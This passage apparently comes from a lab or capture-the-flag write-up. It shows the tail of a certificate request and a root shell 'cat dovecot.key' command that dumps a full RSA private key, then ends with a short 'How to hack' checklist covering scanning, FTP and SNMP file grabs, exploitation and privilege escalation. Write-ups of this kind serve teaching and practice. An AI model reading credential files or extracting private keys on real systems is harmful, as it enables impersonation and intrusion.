QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI3B9zux9T0ICw5RT2
B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r0VjiGp265B9ybChp
ZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IKx0brpFezr/lUZQiJ
qSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt5pNdYZw9DBK4LjuP
+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQlJchLaDsGkBQ0xaiC
aWveA8AxW59wcXC1tUGXJAkCAwEAAaAAMA0GCSqGSIb3DQEBCwUAA4IBAQClb0DU
DL8cJcdKwN3EeWDOibyeis9t0y7PP5cL4Vlgs43zew3F3uH8W9E6nU/ZFKm7b2x3
9IRUG/C3c/6eAl3NysAGB4NOevs/ragvEH5/AhA1ZcAJzK9ZE8ybDVPyTRe+Wety
HjKJVu5653d+boLZBb7CyNu7oGpXDkjnw9fseGHJql7biaxNgNpWChUv7Y54AHyv
KYHX3xQbWghVSmOlLn+3n6/V0hMnk6oKLhec9xPHq4t6cRSuM5k98NYWlugPm9qm
YxiT7+EPKBado/tU286ZkIKTfPv9ilDrSGSlPgyKrqDVYbHNEhY/TCBKGROe85Ot
0d9Nt/LiPYd1uQXW
-----END CERTIFICATE REQUEST-----

bash-4.4# cat dovecot.key
cat dovecot.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAwRxcr/dlz15QJjhwNe82v/zz23Xx/BJrBEF2UeNN8AMCdsjc
H3O7H1PQgLDlFPYH+k3Hbb2K1TAjvbdgg9KxAoJZV4JLBqZm5N2QepI4iCp3rivR
WOIanbrkH3JsKGlmQyB+0mO+cdpQ1eE+cM6whbCnRYp6jPp93qEXzXsuiHavwgrH
RuukV7Ov+VRlCImpIw15hFVnHMniMcmqrQ5Z+HgNVMm5ABDq7JRXVKDPXrfuLO3m
k11hnD0MErguO4/6zSILqjPvoyBKz6a0QV9zQPn0q3IkS17gdaqEqwwa8fOa9CUl
yEtoOwaQFDTFqIJpa94DwDFbn3BxcLW1QZckCQIDAQABAoIBAQCTPb7mZOp57N2L
5uiYFydVx9df9FRn8NssSYWf9oLMiF7ul0RPrvx0bIHEPhzNmLKIhZmT8TvURXpb
A2FR4eoZka3xbWUrUuGNi+rHqon0OP08Dij3bp8AuSmLWMFjJspUUIiifm8NfHq6
OZ5UgSRTK1i/S1EaATzL7WSqxku6u/9+YdaSBUu2vO8/b59QMv2j88Bu0CqRXJ0G
RK2fPDuO/69YRQ8xvdOnLCyMwDy0+6b8DAXuu4yvV8Hbjo3ZVpKmMoMZ6hFwEbkT
lZUHwETPZ0BM9i2xcsCh6EFeDmp6X0LfR+zCLRZ4eWN2VZrDw+M6gSOqvJi7vrOe
eSf9P7npAoGBAPY5wctfui1nyWxlrfYeaM0S6/SSZJW8jWVL4E264HAw0XU8HjWw
ldAqbra93b2JDL9fzgSlGsoH2woy5I56xrLt3JMU8qi3mFVq81s2T+VoA91IvtiQ
0eTV1hJCDFsVjcSPflR7DLeqZRHw4835lfdsIJ6udg7K8n9Hoo4u92vXAoGBAMjG
1LyP6C99mHLUgPgxgGACEOsoYro7d5Cwav916jE9jpsroi5yoVNk21A73+e029JK
U8olQPyHxH9U6ENIOljYmF2vSNJO1K+kIY//KIgE5X59zyl3rpw/874LrZ+0WNGI
ocv5JTGojmorbP7OvquxaphFGB9oOUzNVksTXPMfAoGBAPKyn3itFMAoqvuzhbMw
6jApVHavzYFiZyTPk3pKl2s+U1dxOH3HXwPer15k66ok6nHAJzug2jUFZTw6Sdq+
3hgEKQS5Ay6WOQsI7nKbqEkBK730NFkW9izPMcCxZahqKGD055qx5ykqRZFXldOz
DcThyY1ffXK7TCd1Hp9zX+HlAoGBAIvJi4JBe3ndKxAADk8/P88YgSkI9DwPfT6a
5dQ5B7YC0tAMgB1wqAvE88EX/tt3G3l9UHs0ltt7t36j4hY+KomDPAo2KTBrvD8R
umBkWZbiOdpow5xufH7DM/QEc3z29sPkKio2rAO4BHe9BmUeEri9jKa5rILpcMOd
T1B0CconAoGBALPVKcxI+wBPg6meu6Ey9Aum5NQ2rb+zuA6b6Wvmm7o3qORLKI14
lXW4VNEW5BowrnqcwYxWFZh5oUj3zjOS1bYPOWpBraDIsnGA17tCIsE3YqFiKASm
Ka9NhOLsIcZLUBoM2g0AEJoCt6tuNOkjbrXAO023beh++EGGNDGPJRvO
-----END RSA PRIVATE KEY-----</code></pre>
<p>Rooted.</p>
<h2 id="how-to-hack">How to hack</h2>
<ol type="1">
<li>Scan</li>
<li>Fetch files from FTP</li>
<li>Fetch file from SNMP</li>
<li>Find the exploit, login.</li>
<li>Search for password; look at file.</li>
<li>Become patrick.</li>
<li>Figure out what you can run as root.</li>
<li>Run it. Don’t take the script seriously, do your own thing.</li>
<li>???</li>
<li>Profit.</li>
</ol>
